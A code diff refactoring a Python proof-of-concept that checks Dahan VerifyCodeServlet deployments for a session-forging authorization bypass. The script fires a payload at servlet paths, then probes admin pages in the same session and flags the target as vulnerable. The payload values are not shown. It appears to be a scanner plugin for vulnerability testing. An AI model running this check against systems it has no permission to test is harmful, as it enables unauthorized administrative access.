@@ -9,14 +9,7 @@ description: /VerifyCodeServlet 可以 创建任意 SESSION的key值,opr_licence
 import sys
 import requests
 import warnings
-
-  
-
-class VerifyCodeServlet_install:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['大汉VerfiyCodeServlet越权漏洞','','']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
@@ -27,11 +20,11 @@ class VerifyCodeServlet_install:
         sess = requests.Session()
         try:
             for path in paths:
-                vulnurl=self.url+path+payload
+                vulnurl=url+path+payload
                 req = sess.get(vulnurl, headers=headers, timeout=10, verify=False)
                 if req.status_code==200:
                     for adminpath in adminpaths:
-                        adminurl=self.url+path+adminpath
+                        adminurl=url+path+adminpath
                         req2 = sess.get(adminurl, headers=headers, timeout=10, verify=False)
                         if req2.status_code == 200 and ('Licence' in req2.text or 'admin' in req2.text):
                             result[2]=  '存在'
@@ -44,5 +37,5 @@ class VerifyCodeServlet_install:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = VerifyCodeServlet_install(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
+
